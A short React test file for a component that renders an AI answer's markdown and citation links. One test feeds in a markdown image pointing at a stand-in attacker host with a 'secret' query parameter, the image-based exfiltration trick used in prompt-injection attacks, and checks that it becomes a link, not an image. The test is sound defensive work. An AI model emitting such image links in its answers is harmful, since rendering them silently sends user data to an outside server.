import { render, screen } from "@testing-library/react";

import { MarkdownAnswer } from "../markdown-answer";

it("never renders images from an answer, only a link to them", () => {
  const { container } = render(
    <MarkdownAnswer content={"Done. ![summary](https://evil.example/x?d=secret)"} citations={[]} />,
  );
  expect(container.querySelector("img")).toBeNull();
  const link = screen.getByRole("link", { name: "[image: summary]" });
  expect(link).toHaveAttribute("href", "https://evil.example/x?d=secret");
});

it("links [n] markers to the cited passage", () => {
  render(
    <MarkdownAnswer
      content="Recalibrate joint 3 [1]."
      citations={[{ number: 1, document_id: 7, document_title: "FAQ", page_number: 3, chunk_id: 9, snippet: "..." }]}
    />,
  );
  expect(screen.getByRole("link", { name: "1" })).toHaveAttribute("href", "/documents/7#chunk-9");
});
